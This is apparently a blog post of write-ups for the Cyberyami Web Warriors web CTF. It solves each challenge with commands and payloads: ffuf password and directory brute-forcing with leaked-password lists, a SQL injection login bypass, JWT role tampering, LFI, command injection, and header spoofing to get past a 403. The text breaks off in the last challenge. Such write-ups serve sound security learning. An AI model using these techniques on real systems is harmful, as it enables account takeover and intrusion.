---
title: "Cyberyami Web Warriors"
description: "Writeups for the Cyberyami Web Warriors Capture The Flag (CTF) event."
summary: "Writeups for the Cyberyami Web Warriors Capture The Flag (CTF) event."
date: 2024-09-22
draft: false
tags: ["Cyberyami", "CTF", "Web"]
---

------------------------

__CTF Event URL__: https://www.cyberyami.com/compete/cyberyami-web-warriors-dsgisbwd \
__Event Start Time__: September 21, 2024, at 11:00 AM (IST) \
__Event End Time__: September 21, 2024, at 09:00 PM (IST)

## Challenges

### Vanish

URL: `http://3.7.252.130/Vanish/` \
Point: `+30` \
Description: *Forget stains!*

Flag is in white color (same as background), so we can't see it directly. To see the flag, open the page's HTML source code (`Ctrl`+`U`).

![vanish-flag.png](files/vanish-flag.png#center)

Flag: `CyberYami{4ll_3ye5_0n_M3}`

### Antique_cafe

URL: `http://3.7.252.130/Antique_cafe/` \
Point: `+30` \
Description: *Visit our cafe.*

Flag is divided into four parts. The first part can be found in the page's HTML source code.

![antique_cafe-1.png](files/antique_cafe-1.png#center)

`http://3.7.252.130/Antique_cafe/` => `CyberYami{Y`

The second part is in the `robots.txt` file.

![antique_cafe-2.png](files/antique_cafe-2.png#center)

`http://3.7.252.130/Antique_cafe/robots.txt` => `0u__g0`

The third part is in the `tailwind.css` file.

![antique_cafe-3.png](files/antique_cafe-3.png#center)

`http://3.7.252.130/Antique_cafe/css/tailwind.css` => `T_th3M`

The fourth and last part of the flag is in the `parallax.min.js` file.

![antique_cafe-4.png](files/antique_cafe-4.png#center)

`http://3.7.252.130/Antique_cafe/js/parallax.min.js` => `_4ll!!!}`

Flag: `CyberYami{Y0u__g0T_th3M_4ll!!!}`


### Kevin

URL: `http://3.7.252.130/Kevin/` \
Point: `+30` \
Description: _**Post**man cames and ...._

As the description highlights the `Post`, we just have to make a POST request to the challenge URL.

![kevin-flag.png](files/kevin-flag.png#center)

Flag: `CyberYami{K3v1n_tH3_h4cK3r}`

### Login 1

URL: `http://13.201.47.7/Login1/` \
Point: `30` \
Description: _Just login, That's it._

![login_1-1.png](files/login_1-1.png#center)

It is just one simple login page. After trying different injection techniques, nothing worked, so let's use the last resort **Brute Force**.

```bash
┌──PS(Aftab@Sama)-[~\Downloads]
└─$ ffuf -H 'Content-Type: application/x-www-form-urlencoded' -d 'u=admin&p=FUZZ' -w D:\Tools\wordlist\web\SecLists-2024.3\Passwords\Leaked-Databases\rockyou-50.txt -u 'http://13.201.47.7/Login1/' -fr 'Invalid username or password.'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://13.201.47.7/Login1/
 :: Wordlist         : FUZZ: D:\Tools\wordlist\web\SecLists-2024.3\Passwords\Leaked-Databases\rockyou-50.txt
 :: Header           : User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : u=admin&p=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid username or password.
________________________________________________

password123             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 32ms]ors: 0 ::
:: Progress: [9436/9436] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

We found a valid password. when we login using `admin:password123`. We get the flag.

![login_1-flag.png](files/login_1-flag.png#center)

Flag: `CyberYami{congr4ts_y0u_l0gg3d_1n_succ3s5fully}`

### Login 2

URL: `http://3.7.252.130/Login2/index.php` \
Point: `50` \
Description: _Really just login, That's it._

![login_2-1.png](files/login_2-1.png#center)

This is like the previous login challenge, so let's brute force again!

```bash
┌──PS(Aftab@Sama)-[~\Downloads]
└─$ ffuf -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin&password=FUZZ' -w D:\Tools\wordlist\web\SecLists-2024.3\Passwords\Leaked-Databases\rockyou-50.txt -u 'http://3.7.252.130/Login2/index.php' -fr 'Invalid username or password.'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://3.7.252.130/Login2/index.php
 :: Wordlist         : FUZZ: D:\Tools\wordlist\web\SecLists-2024.3\Passwords\Leaked-Databases\rockyou-50.txt
 :: Header           : User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid username or password.
________________________________________________

iloveyou                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 32ms]ors: 0 ::
:: Progress: [9436/9436] :: Job [1/1] :: 275 req/sec :: Duration: [0:00:46] :: Errors: 0 ::
```

We are able to login using these credentials, but when we login, we don't see the flag. We also notice one extra cookie: `admin=False`. So let's change it to true. And we get the flag.

![login_2-flag.png](files/login_2-flag.png#center)

Flag: `CyberYami{4dmin_4cce55_gr4nt3d}`


### Photo Gallery

URL: `http://3.7.252.130/PhotoGallery/` \
Points: `+50` \
Description: _We have lot of photos._

Here we have 8 photos that can be accessed in two ways.
`challenge.php?photo=1` or `photos/1.jpg`

![photo-gallery-1.png](files/photo-gallery-1.png#center)

The directory listing is enabled for `/photos/` and there are only 8 images. This `photo` GET parameter looks interesting. After trying a bunch of injections, parameter and method/verb tempering techniques, I couldn't find anything, so let's do brute force (again!) for this photos GET parameter ID value.

```bash
┌──PS(Aftab@Sama)-[~\Downloads]
└─$ seq 1 100 > id.txt

┌──PS(Aftab@Sama)-[~\Downloads]
└─$ ffuf -u 'http://3.7.252.130/PhotoGallery/challenge.php?photo=FUZZ' -w id.txt -fr 'Invalid photo number.'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://3.7.252.130/PhotoGallery/challenge.php?photo=FUZZ
 :: Wordlist         : FUZZ: C:\Users\Jack\Downloads\id.txt
 :: Header           : User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid photo number.
________________________________________________

9                       [Status: 200, Size: 22, Words: 6, Lines: 1, Duration: 44ms]::
87                      [Status: 200, Size: 101, Words: 11, Lines: 1, Duration: 94ms]:
8                       [Status: 200, Size: 1032907, Words: 5314, Lines: 4480, Duration: 49ms]
2                       [Status: 200, Size: 1000983, Words: 2853, Lines: 3423, Duration: 28ms]
4                       [Status: 200, Size: 871578, Words: 3216, Lines: 3317, Duration: 49ms]
5                       [Status: 200, Size: 1292467, Words: 5772, Lines: 5229, Duration: 51ms]
3                       [Status: 200, Size: 1317021, Words: 5095, Lines: 5358, Duration: 52ms]
1                       [Status: 200, Size: 1448290, Words: 5456, Lines: 5991, Duration: 36ms]
6                       [Status: 200, Size: 1235823, Words: 4555, Lines: 4155, Duration: 52ms]
7                       [Status: 200, Size: 2176221, Words: 11245, Lines: 9070, Duration: 49ms]
:: Progress: [100/100] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

We found one new value: `87`. It will return the flag.

![photo-gallery-flag.png](files/photo-gallery-flag.png#center)

Flag: `CyberYami{Y0u_f0und_th3_h1dd3n_ph0t0}`


### Snacks

URL: `http://3.7.252.130/Snacks` \
Points: `+50` \
Description: _Hmm Yummy._

This website is pretty much static. But the following three JavaScript files look interesting because they contain obfuscated JS code.

![snacks-1.png](files/snacks-1.png#center)

We can use online deobfuscator tools like https://deobfuscate.relative.im/ to deobfuscate the JavaScript code.

After deobfuscating the `http://3.7.252.130/Snacks/js/min-1.11.0.js` file, we get the following:

```js
function ObjectP() {
  var _0x8b8fd3 = String.fromCharCode(67, 121, 98, 101, 114, 89, 97)
}
```

We can use browser DevTool's console page to decode this.

![snacks-2.png](files/snacks-2.png#center)

deobfuscated code of `http://3.7.252.130/Snacks/js/min-1.12.1.js` file:

```js
function ObjectP() {
  var _0x53a201 = String.fromCharCode(109, 105, 123, 74, 52, 118, 52)
}
```

![snacks-3.png](files/snacks-3.png#center)

deobfuscated code of `http://3.7.252.130/Snacks/js/min-2.1.0.js` file:

```js
function ObjectP() {
  var _0x59964d = atob('NWNyMXB0XzBiZnU1YzR0MTBuISF9')
}
```

![snacks-4.png](files/snacks-4.png#center)

Flag: `CyberYami{J4v45cr1pt_0bfu5c4t10n!!}`

### Login 3

URL: `http://3.7.252.130/Login3/` \
Points: `+50` \
Description: _Ok, Not just login._

This time we again do brute force to get the login credentials, but the admin username doesn't work, so we also need to brute force username.

```bash
┌──PS(Aftab@Sama)-[~\Downloads]
└─$ ffuf -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=USERFUZZ&password=PASSFUZZ' -w D:\Tools\wordlist\web\SecLists-2024.3\Usernames\top-usernames-shortlist.txt:USERFUZZ -w D:\Tools\wordlist\web\SecLists-2024.3\Passwords\Default-Credentials\default-passwords.txt:PASSFUZZ -u 'http://3.7.252.130/Login3/' -fr 'Invalid login credentials!'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://3.7.252.130/Login3/
 :: Wordlist         : USERFUZZ: D:\Tools\wordlist\web\SecLists-2024.3\Usernames\top-usernames-shortlist.txt
 :: Wordlist         : PASSFUZZ: D:\Tools\wordlist\web\SecLists-2024.3\Passwords\Default-Credentials\default-passwords.txt
 :: Header           : User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=USERFUZZ&password=PASSFUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid login credentials!
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 32ms]Duration: [0:01:17] :: Errors: 0 ::
    * PASSFUZZ: password
    * USERFUZZ: guest

:: Progress: [22338/22338] :: Job [1/1] :: 385 req/sec :: Duration: [0:01:19] :: Errors: 0 ::
```

We can login using `guest:password`.

![login_3-1.png](files/login_3-1.png#center)

We notice one new JWT cookie after successful login. In that our role is `user` we can just change it admin and base64 encode it again; and it will be accepted. The JWT signature is not being verified.

![login_3-2.png](files/login_3-2.png#center)

Flag: `CyberYami{JWT_N0n3_Alg0r1thm_Byp4ss}`

### ShopU

URL: `http://3.7.252.130/ShopU` \
Points: `50` \
Description: _We love ShopU :)_

This site is static. So let's do brute force to find some hidden pages.

```bash
┌──PS(Aftab@Sama)-[~\Downloads]
└─$ ffuf -u 'http://3.7.252.130/ShopU/FUZZ' -w $wordlist_good

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://3.7.252.130/ShopU/FUZZ
 :: Wordlist         : FUZZ: D:\Tools\wordlist\web\good.txt
 :: Header           : User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 21ms]0 ::
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 33ms] 1 ::
/.htpasswd              [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 30ms]rs: 1 ::
:: Progress: [4193/4193] :: Job [1/1] :: 145 req/sec :: Duration: [0:00:28] :: Errors: 1 ::
```

The `.htpasswd` file is accessible, which leads to the flag.

![shoupu-flag.png](files/shoupu-flag.png#center)

Flag: `CyberYami{G0t_Th3_S3cr3t_Fl4g!!!}`

### Restaurant

URL: `http://3.7.252.130/Restaurant` \
Points: `50` \
Description: _It's very famous restaurant._

![restaurant-1.png](files/restaurant-1.png#center)

Clicking on `Order Now` we see one POST request with empty `order=` data.

![restaurant-2.png](files/restaurant-2.png#center)

If we enter any non-empty value in the `ordder` POST parameter, we see one extra header, `X-Char:` which is returning one flag character at a time.

![restaurant-3.png](files/restaurant-3.png#center)

We can write a simple script to get the entire flag.

```powershell
1..31 | ForEach-Object {
Write-Host -NoNewline $(curl -si http://3.7.252.130/Restaurant/ -d 'order=x' -b 'PHPSESSID=4v2smlksuud8e5a93p6794q30f' | grep -oP '(?<=X-Char: ).')
}
```

Flag: `CyberYami{Ch4r_By_Ch4r_Exfil@@}`


### Yami

URL: `http://3.7.252.130:8080/` \
Points: `+100` \
Description: _We have started new food business._

In the `menu.jsp` page we have a very simple and clear LFI.

![yami-1.png](files/yami-1.png#center)

In the `about.jsp` page, we notice one comment related to flag.

![yami-2.png](files/yami-2.png#center)

`http://3.7.252.130:8080/about.jsp` => `<!-- Flag is in flag -->`

Now we know that the `Flag is in flag` (not flag.txt). and by reading the source code of `menu.jsp` we know that we are in `/usr/local/tomcat/webapps/ROOT/menu` directory.

After some trial and error and searching some well-known Linux directories, we found our flag in the `/var/www/` directory.

![yami-3.png](files/yami-3.png#center)

Flag: `CyberYami{lF1_3xpl01t_5uCce5s!!}`

### Login 4

URL: `http://3.7.252.130:8081/` \
Points: `+50` \
Description: _Again login, That's it._

This login form is vulnerable to SQLi. We can login using a payload like `admin' or '1'='1`.

![login_4-1.png](files/login_4-1.png#center)

![login_4-2.png](files/login_4-2.png#center)

Flag: `CyberYami{5ql_1nj3ct1on_suCc3ssFul$$--;-}`

### Login 5

URL: `http://3.7.252.130/Login5/` \
Points: `+50` \
Description: _I'm back with one more login._

This time we notice obfuscated code in the JavaScript file. Let's deobfuscate it using https://deobfuscate.relative.im/. We get the following code:

```js
document
  .getElementById('login-form')
  .addEventListener('submit', function (_0x5170d8) {
    _0x5170d8.preventDefault()
    var _0x297c57 = 'hidden_user',
      _0x455914 = 'super_hidden_password ',
      _0x4f9d8a = document.getElementById('username').value,
      _0x969523 = document.getElementById('password').value
    _0x4f9d8a === _0x297c57 && _0x969523 === _0x455914
      ? fetch('verify.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            username: _0x4f9d8a,
            password: _0x969523,
          }),
        })
          .then((_0x1233c0) => _0x1233c0.json())
          .then((_0xf8f4a4) => {
            _0xf8f4a4.status === 'success'
              ? (document.getElementById('message').innerHTML =
                  'Flag: ' + _0xf8f4a4.flag)
              : (document.getElementById('message').innerHTML =
                  'Invalid credentials!')
          })
      : (document.getElementById('message').innerHTML = 'Invalid credentials!')
  })
```

We found the `username = 'hidden_user'` and `password = 'super_hidden_password '`. Don't miss the space at last in the password!

When we try to login using these credentials, we get the flag.

![login_5-flag.png](files/login_5-flag.png#center)

Flag: `CyberYami{tH3_h1dd3n_fl4g_1s_h3r3}`

### Healet

URL: `http://3.7.252.130/Healet` \
Points: `+30` \
Description: _Jewellery shop._

When we visit the challenge page, we notice a strange response header called **`X-Ses`**.

![healet-1.png](files/healet-1.png#center)

This looks like a hexadecimal number. We obtain the flag by decoding it from hex.

![healet-flag.png](files/healet-flag.png#center)

Flag: `CyberYami{h34D3r_fL4G_!!}`

### Pill

URL: `http://3.7.252.130/Pill` \
Points: `+30` \
Description: _Take your pill._

We are offered the choice of selecting a pill from red or blue.

![pill-1.png](files/pill-1.png#center)

The selected pill is submitted using the GET parameter `pill=red`.
Let's see what additional colors are available.

```bash
┌──PS(Aftab@Sama)-[~\Downloads]
└─$ ffuf -u 'http://3.7.252.130/Pill/?pill=FUZZ' -w colors-list.txt -fr 'Invalid pill selection!'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://3.7.252.130/Pill/?pill=FUZZ
 :: Wordlist         : FUZZ: C:\Users\Jack\Downloads\colors-list.txt
 :: Header           : User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid pill selection!
________________________________________________

purple                  [Status: 200, Size: 1517, Words: 456, Lines: 55, Duration: 23ms]
red                     [Status: 200, Size: 1494, Words: 456, Lines: 55, Duration: 28ms]
blue                    [Status: 200, Size: 1495, Words: 456, Lines: 55, Duration: 5826ms]
:: Progress: [166/166] :: Job [1/1] :: 16 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

The newly discovered `purple` pill returns the flag.

![pill-flag.png](files/pill-flag.png#center)

Flag: `CyberYami{Purpl3_p1ll_fl4g_1234$}`

### Carvilla

URL: `http://3.7.252.130/Carvilla/` \
Points: `30` \
Description: _Cars services._

There is no input on this static webpage. A strange cookie called `"_ma"` is being set.

![carvilla-1.png](files/carvilla-1.png#center)

It is a base32-encoded string. Decoding it with base32 will reveal the flag.

![carvilla-flag.png](files/carvilla-flag.png#center)

Flag: `CyberYami{C00K1E_c00k1e_123$$}`

### CYShell

URL: `http://13.201.47.7:8080/` \
Points: `+100` \
Description: _Our famous bot._

![cyshell-1.png](files/cyshell-1.png#center)

When we click the submit button in `Commands.php`, we get output similar to `uname` on Linux. Checking the source code, we find one hidden form field with the `name="cmd"` and `value="uname -a"`.

![cyshell-2.png](files/cyshell-2.png#center)

This seems quite interesting. Let's see whether we can run our commands.

![cyshell-3.png](files/cyshell-3.png#center)

Okay, now we have RCE. Let us find the flag. In the HTML source code of the home page, there is one comment which indicates the location of the flag file.

![cyshell-4.png](files/cyshell-4.png#center)

We now know that the flag is located in `'/flag.txt'`, but we can't print it using `cat`. Perhaps some protections are in place, but we can use other utilities, such as `base64`, to return the encoded file, possibly evading them.

![cyshell-5.png](files/cyshell-5.png#center)

![cyshell-flag.png](files/cyshell-flag.png#center)

Flag: `CyberYami{N0t_S0_MucH_53cur3!}`


### Denied

URL: `http://3.7.252.130:8083/` \
Points: `100` \
Description: _CyberYami IT Solutions._

This is a static website. There is only one form field, and it is not injectable. So, let's look for any hidden directories.

```bash
┌──PS(Aftab@Sama)-[~\Downloads]
└─$ ffuf -u 'http://3.7.252.130:8083/FUZZ' -w $wordlist_good

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://3.7.252.130:8083/FUZZ
 :: Wordlist         : FUZZ: D:\Tools\wordlist\web\good.txt
 :: Header           : User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

/admin/config.php       [Status: 403, Size: 962, Words: 170, Lines: 49, Duration: 33ms]
//admin/config.php      [Status: 403, Size: 962, Words: 170, Lines: 49, Duration: 32ms]
.htaccess.save          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms]:
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 22ms]::
.htaccess-marco         [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]::
.htpasswrd              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms]0 ::
.htusers                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms]0 ::
.htpasswds              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 26ms]0 ::
.htpasswd_test          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 25ms]0 ::
.htaccess-dev           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms]0 ::
.ht_wsr.txt             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms]0 ::
.htpasswd-old           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms]0 ::
.htpasswd.inc           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 26ms]0 ::
.htaccess.old           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms]0 ::
.htaccess_orig          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 28ms]1 ::
.htaccess_extra         [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 33ms]1 ::
.htaccessOLD            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms]1 ::
.htaccess.bak1          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 32ms]1 ::
.htaccess_sc            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms]1 ::
.htaccessOLD2           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 25ms]1 ::
.htaccess~              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms]1 ::
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 29ms]1 ::
.htaccess.inc           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms]1 ::
.httpie/                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms]1 ::
.htaccessBAK            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]1 ::
.htgroup                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 27ms]1 ::
.httr-oauth             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms]1 ::
.htaccess.txt           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]1 ::
.htaccess-local         [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms]1 ::
.htpasswd.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 22ms] 1 ::
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
.htaccess.orig          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
.htaccess.sample        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 24ms] 1 ::
.htaccess/              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 32ms] 1 ::
.htpasswd/              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 23ms] 1 ::
.htaccess.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
//admin/.env            [Status: 403, Size: 962, Words: 170, Lines: 49, Duration: 30ms]1 ::
/admin/.env             [Status: 403, Size: 962, Words: 170, Lines: 49, Duration: 31ms]1 ::
/admin/.git/config      [Status: 403, Size: 962, Words: 170, Lines: 49, Duration: 30ms]1 ::
/.htaccessOLD           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms] 1 ::
/.htaccess-marco        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms] 1 ::
/.htaccess.BAK          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms] 1 ::
/.htpasswd_test         [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms] 1 ::
/.htaccess-local        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms] 1 ::
/.htaccessBAK           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
/.htaccess.bak1         [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 42ms] 1 ::
/.htaccess_extra        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 37ms]
/.htaccess/             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 32ms] 1 ::
/.htaccess_orig         [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 41ms] 1 ::
/.htgroup               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 41ms]
/.htaccess.sample       [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
/.htaccess~             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 43ms] 1 ::
/.htaccess              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 33ms]
/.htaccess.save         [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 36ms] 1 ::
/.htaccessOLD2          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
/.htpasswrd             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 32ms] 1 ::
/.htaccess.bak          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 38ms] 1 ::
/.htpasswd.inc          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
/.htpasswd              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 26ms] 1 ::
/.htpasswds             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
/.htpasswd-old          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
/.htaccess.orig         [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 38ms] 1 ::
/.htaccess.old          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 37ms] 1 ::
/.htaccess_sc           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
/.htaccess.inc          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 31ms] 1 ::
/.htaccess-dev          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 29ms] 1 ::
/.htaccess.swp          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 29ms] 1 ::
/.htpasswd.bak          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms] 1 ::
/.htpasswd/             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 30ms] 1 ::
/.htaccess.txt          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 33ms] 1 ::
/admin/phpmyadmin/      [Status: 403, Size: 962, Words: 170, Lines: 49, Duration: 31ms]1 ::
/admin/phpmyadmin2/     [Status: 403, Size: 962, Words: 170, Lines: 49, Duration: 37ms]1 ::
:: Progress: [4193/4193] :: Job [1/1] :: 151 req/sec :: Duration: [0:00:28] :: Errors: 1 ::
```

We receive a large number of 403 pages, but one thing stands out: the response size for the `/admin` directory differs from others.

The challenge name 'Denied' additionally hints that we must bypass this `403`.
After attempting various path-based mutations and IP-based headers, certain headers such as `"X-Forwarded-For"` and `"Client-IP"` successfully bypassed the 403 error and returned the flag in the response.

![denied-flag.png](files/denied-flag.png#center)

Flag: `CyberYami{Y0U_R34lLy_kN0w_h0W_to_T4ckL3!!!}`


### Unfound

URL: `http://3.7.252.130:8084/` \
Points: `100` \
Description: _Bad API getting error 404, can you make it correct._

![unfound-1.png](files/unfound-1.png#center)

We can see that it is sending a call to the "/api/getflag" endpoint from the HTML source code.
When we visit the page, we receive the Access Denied message: "The content can't be loaded in this browser".

![unfound-2.png](files/unfound-2.png#center)

This message indicates that the response is browser dependent. But how does the server determine which type of browser is making the request? It uses the `User-Agent` header.
`curl` is the most popular tool for making requests, so let's use it to make a request to this endpoint.

![unfound-3.png](files/unfound-3.png#center)

We receive a different message. That's a good sign.
It is simply verifying if the word "curl" appears in the User-Agent header. We can verify this by sending a request with and without curl in the User-Agent field.

![unfound-4.png](files/unfound-4.png#center)

> Note: The `"-A"` flag in curl is used to specify the `User-Agent`.

